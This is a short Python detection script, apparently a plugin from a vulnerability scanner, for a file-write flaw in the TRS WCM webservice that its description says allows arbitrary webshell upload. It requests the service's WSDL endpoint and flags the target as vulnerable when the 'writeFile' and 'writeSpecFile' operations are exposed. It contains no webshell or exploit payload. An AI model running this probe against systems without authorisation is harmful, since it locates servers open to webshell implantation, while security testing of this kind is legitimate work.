#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: TRS wcm webservice文件写入漏洞
referer: https://www.secpulse.com/archives/18044.html
author: Lucifer
description: 拓尔思wcm系统webservice有两处操作可任意写入webshell。
'''
import sys
import requests
import warnings
def run(url):
        result = ['TRS wcm webservice文件写入漏洞','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/wcm/services/trs:templateservicefacade?wsdl"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"writeFile" in req.text and r"writeSpecFile" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])

